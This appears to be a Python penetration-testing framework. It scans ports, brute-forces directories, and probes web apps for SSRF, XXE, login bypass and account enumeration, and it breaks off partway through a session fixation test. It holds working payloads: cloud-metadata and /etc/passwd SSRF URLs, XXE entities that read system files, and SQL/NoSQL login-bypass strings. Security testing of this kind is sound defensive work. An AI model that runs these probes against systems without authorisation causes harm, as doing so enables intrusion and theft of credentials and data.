#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import logging
import time
import requests
import socket
import re
import subprocess
import threading
import concurrent.futures
import random
import string
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup
from bs4.element import Comment
import math
import ssl
import base64
import argparse

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("comprehensive_testing.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("ComprehensivePenTester")

class ComprehensivePenTester:
    """
    Comprehensive penetration testing framework that implements all standard security
    testing methodologies including:
    - Port and service scanning
    - Web application analysis
    - Injection attacks
    - Authentication and authorization testing
    - Session management testing
    - Cryptographic testing
    - Business logic testing
    - Configuration testing
    - Denial of service testing
    - Client-side testing
    - Information leakage testing
    - API testing
    - Mobile aspect testing
    - Specialized security checks
    """
    
    def __init__(self, target=None, output_dir="security_assessment"):
        self.target = target
        self.output_dir = output_dir
        self.timestamp = time.strftime("%Y%m%d_%H%M%S")
        self.report_dir = os.path.join(output_dir, f"report_{self.timestamp}")
        
        # Create output directory
        os.makedirs(self.report_dir, exist_ok=True)
        
        # Initialize results container
        self.results = {
            "timestamp": self.timestamp,
            "target": target,
            "port_scanning": {},
            "web_analysis": {},
            "injection_testing": {},
            "auth_testing": {},
            "session_testing": {},
            "crypto_testing": {},
            "business_logic": {},
            "config_testing": {},
            "dos_testing": {},
            "client_side": {},
            "info_leakage": {},
            "api_testing": {},
            "mobile_aspects": {},
            "specialized_tests": {}
        }
        
        # Default headers for HTTP requests
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    
    #==========================================
    # 1. Port and Service Scanning Methods
    #==========================================
    
    def port_scan(self, target=None, port_range=None):
        """Scan target for open ports"""
        target = target or self.target
        port_range = port_range or range(1, 1025)  # Default: common ports
        
        logger.info(f"Starting port scan on {target} for ports {port_range[0]}-{port_range[-1]}")
        
        # Parse target
        if not target:
            logger.error("No target specified for port scan")
            return None
            
        # Resolve domain to IP if needed
        target_ip = target
        if not all(c.isdigit() or c == '.' for c in target):
            try:
                target_ip = socket.gethostbyname(target)
                logger.info(f"Resolved {target} to {target_ip}")
            except socket.gaierror:
                logger.error(f"Could not resolve hostname {target}")
                return None
        
        open_ports = []
        
        # Scan ports
        for port in port_range:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)  # 1 second timeout
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    open_ports.append(port)
                    logger.info(f"Port {port} is open on {target_ip}")
                sock.close()
            except Exception as e:
                logger.error(f"Error scanning port {port}: {str(e)}")
        
        # Detect services on open ports
        services = {}
        for port in open_ports:
            service = self._detect_service(target_ip, port)
            if service:
                services[port] = service
        
        # Store results
        result = {
            "target": target,
            "target_ip": target_ip,
            "open_ports": open_ports,
            "services": services
        }
        
        self.results["port_scanning"]["basic_scan"] = result
        return result
    
    def _detect_service(self, ip, port):
        """Attempt to detect services running on a port"""
        common_ports = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            143: "IMAP",
            443: "HTTPS",
            465: "SMTPS",
            993: "IMAPS",
            995: "POP3S",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            8080: "HTTP-Proxy"
        }
        
        # Check if it's a common port
        if port in common_ports:
            service = common_ports[port]
        else:
            service = "Unknown"
            
        # Try to get banner for more info
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            
            # Send a generic request to trigger response
            if port in [80, 443, 8080]:
                sock.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            else:
                sock.send(b"\r\n")
                
            banner = sock.recv(1024)
            sock.close()
            
            # Parse banner if received
            if banner:
                banner_str = banner.decode('utf-8', errors='ignore').strip()
                return {
                    "name": service,
                    "banner": banner_str
                }
        except:
            pass
            
        return {
            "name": service,
            "banner": None
        }
    
    def scan_for_non_standard_services(self, target=None):
        """Scan for services running on non-standard ports"""
        target = target or self.target
        
        logger.info(f"Scanning for non-standard services on {target}")
        
        # First run a basic port scan
        basic_scan = self.results["port_scanning"].get("basic_scan")
        if not basic_scan:
            basic_scan = self.port_scan(target)
            
        # Define standard port-service mappings
        standard_mappings = {
            "HTTP": [80, 8080],
            "HTTPS": [443, 8443],
            "FTP": [21],
            "SSH": [22],
            "TELNET": [23],
            "SMTP": [25, 587],
            "DNS": [53],
            "POP3": [110],
            "IMAP": [143],
            "SNMP": [161],
            "LDAP": [389],
            "SMTPS": [465],
            "IMAPS": [993],
            "POP3S": [995],
            "MySQL": [3306],
            "RDP": [3389],
            "PostgreSQL": [5432]
        }
        
        non_standard_services = []
        
        # Check each detected service
        for port, service_info in basic_scan.get("services", {}).items():
            service_name = service_info["name"]
            
            # Check if service is running on non-standard port
            standard_ports = standard_mappings.get(service_name.upper(), [])
            if port not in standard_ports and standard_ports:  # If service has standard ports but this isn't one
                non_standard_services.append({
                    "port": port,
                    "service": service_name,
                    "standard_ports": standard_ports,
                    "banner": service_info.get("banner")
                })
        
        # Store results
        result = {
            "target": target,
            "non_standard_services": non_standard_services
        }
        
        self.results["port_scanning"]["non_standard_services"] = result
        return result

    #==========================================
    # 2. Web Application Analysis Methods
    #==========================================
    
    def scan_directories(self, target_url=None, wordlist=None):
        """Scan for directories and files on the web server"""
        target_url = target_url or self.target
        
        logger.info(f"Scanning directories on {target_url}")
        
        # Use a small default wordlist for testing
        if not wordlist:
            wordlist = [
                "", "admin", "backup", "conf", "config", "db", "debug", 
                "dev", "development", "test", "testing", "api", "api/v1", 
                "app", "login", "logout", "robots.txt", "sitemap.xml", 
                "wp-admin", "wp-content", "wp-includes", ".git", ".svn"
            ]
        
        found_paths = []
        
        # Ensure target URL has proper format
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
            
        # Remove trailing slash if present
        if target_url.endswith('/'):
            target_url = target_url[:-1]
        
        # Test each path
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_path = {
                executor.submit(self._test_path, target_url, path): path 
                for path in wordlist
            }
            
            for future in concurrent.futures.as_completed(future_to_path):
                path = future_to_path[future]
                try:
                    result = future.result()
                    if result:
                        found_paths.append(result)
                except Exception as e:
                    logger.error(f"Error scanning path {path}: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "found_paths": found_paths,
            "total_found": len(found_paths)
        }
        
        self.results["web_analysis"]["directory_scan"] = result
        return result
    
    def _test_path(self, base_url, path):
        """Test if a path exists on the server"""
        # Construct full URL
        url = f"{base_url}/{path}" if path else base_url
        
        try:
            response = requests.get(url, headers=self.headers, timeout=5, allow_redirects=True)
            
            # Check if path exists (200 OK or other interesting responses)
            if response.status_code in [200, 401, 403]:
                content_type = response.headers.get('Content-Type', '')
                content_length = len(response.content)
                
                return {
                    "url": url,
                    "status_code": response.status_code,
                    "content_type": content_type,
                    "content_length": content_length
                }
                
            return None
        except Exception as e:
            logger.error(f"Error testing path {url}: {str(e)}")
            return None
    
    def check_robots_sitemap(self, target_url=None):
        """Check robots.txt and sitemap.xml for hidden paths"""
        target_url = target_url or self.target
        
        logger.info(f"Checking robots.txt and sitemap.xml on {target_url}")
        
        # Ensure target URL has proper format
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
            
        # Remove trailing slash if present
        if target_url.endswith('/'):
            target_url = target_url[:-1]
        
        results = {
            "robots_txt": {},
            "sitemap_xml": {}
        }
        
        # Check robots.txt
        robots_url = f"{target_url}/robots.txt"
        try:
            response = requests.get(robots_url, headers=self.headers, timeout=5)
            
            if response.status_code == 200:
                # Parse robots.txt content
                disallowed_paths = []
                sitemap_urls = []
                
                for line in response.text.splitlines():
                    line = line.strip()
                    if line.lower().startswith('disallow:'):
                        path = line[len('disallow:'):].strip()
                        if path:
                            disallowed_paths.append(path)
                    elif line.lower().startswith('sitemap:'):
                        sitemap_url = line[len('sitemap:'):].strip()
                        if sitemap_url:
                            sitemap_urls.append(sitemap_url)
                
                results["robots_txt"] = {
                    "found": True,
                    "url": robots_url,
                    "disallowed_paths": disallowed_paths,
                    "sitemap_urls": sitemap_urls,
                    "content": response.text
                }
            else:
                results["robots_txt"] = {
                    "found": False,
                    "url": robots_url,
                    "status_code": response.status_code
                }
        except Exception as e:
            logger.error(f"Error checking robots.txt: {str(e)}")
            results["robots_txt"] = {
                "found": False,
                "url": robots_url,
                "error": str(e)
            }
        
        # Check sitemap.xml
        sitemap_url = f"{target_url}/sitemap.xml"
        try:
            response = requests.get(sitemap_url, headers=self.headers, timeout=5)
            
            if response.status_code == 200:
                # Parse sitemap.xml content
                try:
                    soup = BeautifulSoup(response.content, 'xml')
                    urls = []
                    
                    # Extract URLs from sitemap
                    for loc in soup.find_all('loc'):
                        if loc.string:
                            urls.append(loc.string)
                    
                    results["sitemap_xml"] = {
                        "found": True,
                        "url": sitemap_url,
                        "urls": urls,
                        "urls_count": len(urls),
                        "content": response.text
                    }
                except Exception as e:
                    logger.error(f"Error parsing sitemap.xml: {str(e)}")
                    results["sitemap_xml"] = {
                        "found": True,
                        "url": sitemap_url,
                        "parse_error": str(e),
                        "content": response.text
                    }
            else:
                results["sitemap_xml"] = {
                    "found": False,
                    "url": sitemap_url,
                    "status_code": response.status_code
                }
        except Exception as e:
            logger.error(f"Error checking sitemap.xml: {str(e)}")
            results["sitemap_xml"] = {
                "found": False,
                "url": sitemap_url,
                "error": str(e)
            }
        
        # Store results
        self.results["web_analysis"]["robots_sitemap"] = results
        return results
    
    def analyze_html_comments(self, target_url=None):
        """Analyze HTML comments for sensitive information"""
        target_url = target_url or self.target
        
        logger.info(f"Analyzing HTML comments on {target_url}")
        
        # Ensure target URL has proper format
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            
            if response.status_code == 200:
                # Parse HTML and extract comments
                soup = BeautifulSoup(response.text, 'html.parser')
                comments = soup.find_all(string=lambda text: isinstance(text, Comment))
                
                # Extract comments as strings
                comments_text = [comment.strip() for comment in comments]
                
                # Look for potentially sensitive information in comments
                sensitive_patterns = [
                    r'password', r'username', r'user', r'key', r'secret', r'token',
                    r'api.?key', r'todo', r'fix', r'bug', r'hack', r'workaround',
                    r'removed', r'commented.?out', r'debug', r'test', r'staging'
                ]
                
                sensitive_comments = []
                for comment in comments_text:
                    for pattern in sensitive_patterns:
                        if re.search(pattern, comment, re.IGNORECASE):
                            sensitive_comments.append({
                                "comment": comment,
                                "matched_pattern": pattern
                            })
                            break
                
                # Store results
                result = {
                    "target_url": target_url,
                    "comments_count": len(comments_text),
                    "sensitive_comments_count": len(sensitive_comments),
                    "sensitive_comments": sensitive_comments,
                    "all_comments": comments_text
                }
                
                self.results["web_analysis"]["html_comments"] = result
                return result
            else:
                logger.warning(f"Failed to analyze HTML comments, status code: {response.status_code}")
                return None
                
        except Exception as e:
            logger.error(f"Error analyzing HTML comments: {str(e)}")
            return None
    
    def test_file_upload(self, target_url=None):
        """Test file upload functionality for security issues"""
        # Note: This is a simplified implementation, actual testing would be more complex
        target_url = target_url or self.target
        
        logger.info(f"Testing file upload functionality on {target_url}")
        
        # Find file upload forms
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find upload forms
                upload_forms = []
                
                # Look for forms with file input
                forms = soup.find_all('form')
                for form in forms:
                    file_inputs = form.find_all('input', {'type': 'file'})
                    if file_inputs:
                        form_action = form.get('action', '')
                        form_method = form.get('method', 'post').lower()
                        form_url = urljoin(target_url, form_action) if form_action else target_url
                        
                        upload_forms.append({
                            'url': form_url,
                            'method': form_method,
                            'file_inputs': [{'name': inp.get('name', ''), 'accept': inp.get('accept', '')} for inp in file_inputs]
                        })
                
                # Store results
                result = {
                    "target_url": target_url,
                    "upload_forms_count": len(upload_forms),
                    "upload_forms": upload_forms
                }
                
                self.results["web_analysis"]["file_upload"] = result
                return result
            else:
                logger.warning(f"Failed to find upload forms, status code: {response.status_code}")
                return None
                
        except Exception as e:
            logger.error(f"Error testing file upload: {str(e)}")
            return None

    #==========================================
    # 3. Injection Testing Methods
    #==========================================
    
    # Note: Detailed injection methods are implemented in injection_attacks.py
    # This section contains references and additional methods
    
    def test_ssrf_vulnerability(self, target_url=None):
        """Test for Server-Side Request Forgery vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing for SSRF vulnerabilities on {target_url}")
        
        # Find potential injectable parameters
        params = []
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find forms
            forms = soup.find_all('form')
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                form_url = urljoin(target_url, form_action) if form_action else target_url
                
                # Look for URL input fields
                url_inputs = []
                for inp in form.find_all('input'):
                    input_name = inp.get('name', '')
                    input_type = inp.get('type', '')
                    if (input_type == 'text' or input_type == 'url') and any(term in input_name.lower() for term in ['url', 'link', 'site', 'target', 'dest', 'redirect']):
                        url_inputs.append(input_name)
                
                if url_inputs:
                    params.append({
                        'url': form_url,
                        'method': form_method,
                        'inputs': url_inputs,
                        'source': 'form'
                    })
            
            # Find GET parameters that might be vulnerable
            links = soup.find_all('a', href=True)
            for link in links:
                href = link['href']
                if '?' in href:
                    link_url = urljoin(target_url, href)
                    parsed_url = urlparse(link_url)
                    query_params = parse_qs(parsed_url.query)
                    
                    url_params = []
                    for param_name in query_params:
                        if any(term in param_name.lower() for term in ['url', 'link', 'site', 'target', 'dest', 'redirect']):
                            url_params.append(param_name)
                    
                    if url_params:
                        params.append({
                            'url': link_url,
                            'method': 'get',
                            'inputs': url_params,
                            'source': 'link'
                        })
        
        except Exception as e:
            logger.error(f"Error finding SSRF parameters: {str(e)}")
        
        # Test SSRF payloads
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "file:///etc/passwd",
            "file:///C:/Windows/win.ini"
        ]
        
        results = []
        for param_info in params:
            param_url = param_info['url']
            method = param_info['method']
            
            for input_name in param_info['inputs']:
                for payload in ssrf_payloads:
                    try:
                        if method == 'get':
                            response = requests.get(
                                param_url,
                                params={input_name: payload},
                                headers=self.headers,
                                timeout=10,
                                allow_redirects=False  # Don't follow redirects for safety
                            )
                        else:  # post
                            response = requests.post(
                                param_url,
                                data={input_name: payload},
                                headers=self.headers,
                                timeout=10,
                                allow_redirects=False
                            )
                        
                        # Check for potential SSRF indicators
                        if response.status_code in [200, 301, 302]:
                            if "root:" in response.text or "win.ini" in response.text or "ami-id" in response.text:
                                results.append({
                                    'url': param_url,
                                    'method': method,
                                    'param': input_name,
                                    'payload': payload,
                                    'status_code': response.status_code,
                                    'evidence': 'Internal data exposed in response'
                                })
                                break  # Found vulnerability, no need to try other payloads
                    except Exception as e:
                        logger.error(f"Error testing SSRF payload {payload}: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "params_tested": len(params),
            "vulnerabilities_found": len(results),
            "vulnerabilities": results,
            "params": params
        }
        
        self.results["injection_testing"]["ssrf"] = result
        return result
    
    def test_xxe_vulnerability(self, target_url=None):
        """Test for XML External Entity (XXE) vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing for XXE vulnerabilities on {target_url}")
        
        # Find potential XML endpoints
        xml_endpoints = []
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for forms that might accept XML
            forms = soup.find_all('form')
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'post').lower()
                form_url = urljoin(target_url, form_action) if form_action else target_url
                
                # Check for XML related attributes
                enctype = form.get('enctype', '').lower()
                if 'xml' in enctype or form_method == 'post':
                    xml_endpoints.append({
                        'url': form_url,
                        'method': form_method,
                        'source': 'form',
                        'evidence': f"Form enctype: {enctype}"
                    })
            
            # Look for links to API endpoints
            links = soup.find_all('a', href=True)
            for link in links:
                href = link['href']
                if any(term in href.lower() for term in ['/api', 'xml', 'soap', 'service', 'wsdl']):
                    link_url = urljoin(target_url, href)
                    xml_endpoints.append({
                        'url': link_url,
                        'method': 'post',  # Assume POST for API endpoints
                        'source': 'link',
                        'evidence': f"API-like URL: {href}"
                    })
        
        except Exception as e:
            logger.error(f"Error finding XML endpoints: {str(e)}")
        
        # XXE payloads
        xxe_payloads = [
            """<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [
               <!ELEMENT foo ANY >
               <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
               <foo>&xxe;</foo>""",
               
            """<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [
               <!ELEMENT foo ANY >
               <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" >]>
               <foo>&xxe;</foo>"""
        ]
        
        results = []
        for endpoint in xml_endpoints:
            url = endpoint['url']
            method = endpoint['method']
            
            for payload in xxe_payloads:
                try:
                    headers = self.headers.copy()
                    headers['Content-Type'] = 'application/xml'
                    
                    if method == 'post':
                        response = requests.post(
                            url,
                            data=payload,
                            headers=headers,
                            timeout=10
                        )
                    else:
                        # For GET, include payload in a parameter (uncommon but possible)
                        response = requests.get(
                            url,
                            params={'xml': payload},
                            headers=headers,
                            timeout=10
                        )
                    
                    # Check for XXE indicators
                    if "root:" in response.text or "for 16-bit" in response.text:
                        results.append({
                            'url': url,
                            'method': method,
                            'payload': payload,
                            'evidence': 'File content exposed in response'
                        })
                        break  # Found vulnerability, no need to try other payloads
                    
                except Exception as e:
                    logger.error(f"Error testing XXE payload on {url}: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "endpoints_tested": len(xml_endpoints),
            "vulnerabilities_found": len(results),
            "vulnerabilities": results,
            "endpoints": xml_endpoints
        }
        
        self.results["injection_testing"]["xxe"] = result
        return result
    
    #==========================================
    # 4. Authentication and Authorization Testing Methods
    #==========================================
    
    def test_password_brute_force(self, target_url=None, usernames=None, passwords=None):
        """Test for password brute force vulnerabilities"""
        # Note: This is a simulation, don't perform actual brute force attacks!
        target_url = target_url or self.target
        
        logger.info(f"Testing for password brute force vulnerabilities on {target_url}")
        
        # Use a minimal set of test credentials
        if not usernames:
            usernames = ['admin', 'user', 'test']
        if not passwords:
            passwords = ['password', 'admin', '123456']
        
        # Find login form
        login_form = None
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for login forms
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all('input')
                input_types = [inp.get('type', '').lower() for inp in inputs]
                input_names = [inp.get('name', '').lower() for inp in inputs]
                
                # Check if it has password field
                if 'password' in input_types or any('password' in name for name in input_names):
                    form_action = form.get('action', '')
                    form_method = form.get('method', 'post').lower()
                    form_url = urljoin(target_url, form_action) if form_action else target_url
                    
                    # Find username and password field names
                    username_field = None
                    password_field = None
                    for inp in inputs:
                        input_type = inp.get('type', '').lower()
                        input_name = inp.get('name', '').lower()
                        
                        if input_type == 'password' or 'password' in input_name:
                            password_field = inp.get('name', '')
                        elif input_type == 'text' and any(term in input_name for term in ['user', 'login', 'email', 'name']):
                            username_field = inp.get('name', '')
                    
                    if username_field and password_field:
                        login_form = {
                            'url': form_url,
                            'method': form_method,
                            'username_field': username_field,
                            'password_field': password_field
                        }
                        break
        
        except Exception as e:
            logger.error(f"Error finding login form: {str(e)}")
        
        if not login_form:
            logger.warning("No login form found for brute force testing")
            result = {
                "target_url": target_url,
                "vulnerable": False,
                "message": "No login form found"
            }
            self.results["auth_testing"]["brute_force"] = result
            return result
        
        # Test for rate limiting
        rate_limited = False
        try:
            # Make multiple failed login attempts
            form_data = {
                login_form['username_field']: 'invalid_user',
                login_form['password_field']: 'invalid_password'
            }
            
            for _ in range(3):
                if login_form['method'] == 'post':
                    response = requests.post(
                        login_form['url'],
                        data=form_data,
                        headers=self.headers,
                        timeout=10
                    )
                else:
                    response = requests.get(
                        login_form['url'],
                        params=form_data,
                        headers=self.headers,
                        timeout=10
                    )
                
                # Check for rate limiting indicators
                if response.status_code in [429, 403] or 'too many' in response.text.lower() or 'rate limit' in response.text.lower():
                    rate_limited = True
                    break
                
                time.sleep(1)  # Small delay between requests
                
        except Exception as e:
            logger.error(f"Error testing for rate limiting: {str(e)}")
        
        # Store results (this is a simulation, not actually performing brute force)
        result = {
            "target_url": target_url,
            "login_form": login_form,
            "rate_limited": rate_limited,
            "vulnerable": not rate_limited,
            "message": "Rate limiting detected, resistant to brute force" if rate_limited else "No rate limiting detected, potentially vulnerable to brute force"
        }
        
        self.results["auth_testing"]["brute_force"] = result
        return result
    
    def test_auth_bypass(self, target_url=None):
        """Test for authentication bypass vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing for authentication bypass vulnerabilities on {target_url}")
        
        # Find login form
        login_form = None
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for login forms
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all('input')
                input_types = [inp.get('type', '').lower() for inp in inputs]
                
                # Check if it has password field
                if 'password' in input_types:
                    form_action = form.get('action', '')
                    form_method = form.get('method', 'post').lower()
                    form_url = urljoin(target_url, form_action) if form_action else target_url
                    
                    login_form = {
                        'url': form_url,
                        'method': form_method,
                        'inputs': [(inp.get('name', ''), inp.get('type', '')) for inp in inputs]
                    }
                    break
        
        except Exception as e:
            logger.error(f"Error finding login form: {str(e)}")
        
        if not login_form:
            logger.warning("No login form found for auth bypass testing")
            result = {
                "target_url": target_url,
                "vulnerable": False,
                "message": "No login form found"
            }
            self.results["auth_testing"]["auth_bypass"] = result
            return result
        
        # Auth bypass payloads to test
        bypass_tests = [
            {'name': 'SQL Injection Bypass', 'payload': {"username": "admin' --", "password": "anything"}},
            {'name': 'SQL Injection Bypass 2', 'payload': {"username": "admin' OR '1'='1", "password": "anything"}},
            {'name': 'Always True Bypass', 'payload': {"username": "admin", "password": "' OR '1'='1"}},
            {'name': 'NoSQL Injection', 'payload': {"username": "admin", "password": {"$ne": "xyz"}}},
            {'name': 'Admin Account', 'payload': {"username": "admin", "password": "admin"}},
            {'name': 'Empty Password', 'payload': {"username": "admin", "password": ""}}
        ]
        
        # Identify username and password fields
        username_field = None
        password_field = None
        other_fields = {}
        
        for name, field_type in login_form['inputs']:
            if not name:
                continue
                
            if field_type == 'password':
                password_field = name
            elif field_type == 'text' and any(term in name.lower() for term in ['user', 'login', 'email', 'name']):
                username_field = name
            elif field_type not in ['submit', 'reset', 'button']:
                other_fields[name] = ''
        
        if not username_field or not password_field:
            logger.warning("Could not identify username or password fields")
            result = {
                "target_url": target_url,
                "vulnerable": False,
                "message": "Could not identify username or password fields"
            }
            self.results["auth_testing"]["auth_bypass"] = result
            return result
        
        # Test auth bypass
        results = []
        for test in bypass_tests:
            try:
                # Prepare form data
                form_data = other_fields.copy()
                
                # Handle special NoSQL injection case
                if isinstance(test['payload']["password"], dict):
                    # For NoSQL, need to convert to JSON string
                    form_data[username_field] = test['payload']["username"]
                    form_data[password_field] = json.dumps(test['payload']["password"])
                else:
                    form_data[username_field] = test['payload']["username"]
                    form_data[password_field] = test['payload']["password"]
                
                # Send request
                if login_form['method'] == 'post':
                    response = requests.post(
                        login_form['url'],
                        data=form_data,
                        headers=self.headers,
                        timeout=10,
                        allow_redirects=True
                    )
                else:
                    response = requests.get(
                        login_form['url'],
                        params=form_data,
                        headers=self.headers,
                        timeout=10,
                        allow_redirects=True
                    )
                
                # Check if bypass was successful
                success_indicators = [
                    'dashboard', 'welcome', 'profile', 'account', 'logout',
                    'admin', 'member', 'home'
                ]
                
                if response.status_code == 200 and any(indicator in response.url.lower() or indicator in response.text.lower() for indicator in success_indicators):
                    results.append({
                        'name': test['name'],
                        'payload': test['payload'],
                        'status_code': response.status_code,
                        'response_url': response.url,
                        'evidence': 'Bypass likely successful based on response indicators'
                    })
                
            except Exception as e:
                logger.error(f"Error testing auth bypass {test['name']}: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "login_form": {
                'url': login_form['url'],
                'method': login_form['method'],
                'username_field': username_field,
                'password_field': password_field,
            },
            "tests_performed": len(bypass_tests),
            "vulnerabilities_found": len(results),
            "vulnerabilities": results,
            "vulnerable": len(results) > 0
        }
        
        self.results["auth_testing"]["auth_bypass"] = result
        return result
    
    def test_password_reset(self, target_url=None):
        """Test for password reset vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing for password reset vulnerabilities on {target_url}")
        
        # Find password reset functionality
        reset_form = None
        reset_link = None
        
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for password reset links
            links = soup.find_all('a', href=True)
            for link in links:
                href = link['href'].lower()
                text = link.text.lower()
                
                if any(term in href or term in text for term in ['forgot', 'reset', 'recover', 'password']):
                    reset_link = urljoin(target_url, link['href'])
                    break
            
            # If found a reset link, follow it
            if reset_link:
                reset_response = requests.get(reset_link, headers=self.headers, timeout=10)
                reset_soup = BeautifulSoup(reset_response.text, 'html.parser')
                
                # Look for reset form
                forms = reset_soup.find_all('form')
                for form in forms:
                    inputs = form.find_all('input')
                    input_names = [inp.get('name', '').lower() for inp in inputs]
                    
                    # Check if it looks like a reset form
                    if any(term in ' '.join(input_names) for term in ['email', 'user', 'name', 'account']):
                        form_action = form.get('action', '')
                        form_method = form.get('method', 'post').lower()
                        form_url = urljoin(reset_link, form_action) if form_action else reset_link
                        
                        reset_form = {
                            'url': form_url,
                            'method': form_method,
                            'inputs': [(inp.get('name', ''), inp.get('type', '')) for inp in inputs]
                        }
                        break
        
        except Exception as e:
            logger.error(f"Error finding password reset functionality: {str(e)}")
        
        if not reset_form:
            logger.warning("No password reset form found")
            result = {
                "target_url": target_url,
                "vulnerable": False,
                "message": "No password reset form found"
            }
            self.results["auth_testing"]["password_reset"] = result
            return result
        
        # Test password reset
        vulnerabilities = []
        
        # Find the identifier field (email or username)
        identifier_field = None
        for name, field_type in reset_form['inputs']:
            if field_type in ['text', 'email'] and any(term in name.lower() for term in ['email', 'user', 'name', 'account']):
                identifier_field = name
                break
        
        if not identifier_field:
            logger.warning("Could not identify email/username field in reset form")
            result = {
                "target_url": target_url,
                "reset_form": reset_form,
                "vulnerable": False,
                "message": "Could not identify email/username field"
            }
            self.results["auth_testing"]["password_reset"] = result
            return result
        
        # Test 1: Check for username enumeration
        enum_tests = [
            {"value": "nonexistent@example.com", "expected": "not exist"},
            {"value": "admin@" + urlparse(target_url).netloc, "expected": "sent"}
        ]
        
        for test in enum_tests:
            try:
                form_data = {identifier_field: test["value"]}
                
                # Add other required fields
                for name, _ in reset_form['inputs']:
                    if name != identifier_field and name:
                        form_data[name] = ''
                
                # Send request
                if reset_form['method'] == 'post':
                    response = requests.post(
                        reset_form['url'],
                        data=form_data,
                        headers=self.headers,
                        timeout=10
                    )
                else:
                    response = requests.get(
                        reset_form['url'],
                        params=form_data,
                        headers=self.headers,
                        timeout=10
                    )
                
                # Check for enumeration vulnerability
                response_text = response.text.lower()
                if test["expected"] == "not exist" and any(term in response_text for term in ['no account', 'not exist', 'not found', 'invalid']):
                    vulnerabilities.append({
                        'type': 'Username/Email Enumeration',
                        'test': test,
                        'evidence': 'Response indicates whether account exists'
                    })
                    break
                
            except Exception as e:
                logger.error(f"Error testing reset with {test['value']}: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "reset_link": reset_link,
            "reset_form": {
                'url': reset_form['url'],
                'method': reset_form['method'],
                'identifier_field': identifier_field
            },
            "vulnerabilities_found": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "vulnerable": len(vulnerabilities) > 0
        }
        
        self.results["auth_testing"]["password_reset"] = result
        return result
    
    #==========================================
    # 5. Session Management Testing Methods
    #==========================================
    
    def test_session_fixation(self, target_url=None):
        """Test for session fixation vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing for session fixation vulnerabilities on {target_url}")
        
        # First, get a session cookie
        session_cookie = None
        cookie_name = None
        
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            
            # Look for session cookies
            for cookie in response.cookies:
                if any(term in cookie.name.lower() for term in ['sess', 'sid', 'auth', 'token']):
                    cookie_name = cookie.name
                    session_cookie = cookie.value
                    break
            
            # If no obvious session cookie found, use the first cookie
            if not session_cookie and response.cookies:
                cookie_name = next(iter(response.cookies.keys()))
                session_cookie = response.cookies[cookie_name]
        
        except Exception as e:
            logger.error(f"Error getting initial session: {str(e)}")
        
        if not session_cookie:
            logger.warning("No session cookie found for fixation testing")
            result = {
                "target_url": target_url,
                "vulnerable": False,
                "message": "No session cookie found"
            }
            self.results["session_testing"]["fixation"] = result
            return result
        
        # Find login form
        login_form = None
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for login forms
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all('input')
                input_types = [inp.get('type', '').lower() for inp in inputs]
                
                # Check if it has password field
                if 'password' in input_types:
                    form_action = form.get('action', '')
                    form_method = form.get('method', 'post').lower()
                    form_url = urljoin(target_url, form_action) if form_action else target_url
                    
                    # Identify username and password fields
                    username_field = None
                    password_field = None
                    for inp in inputs:
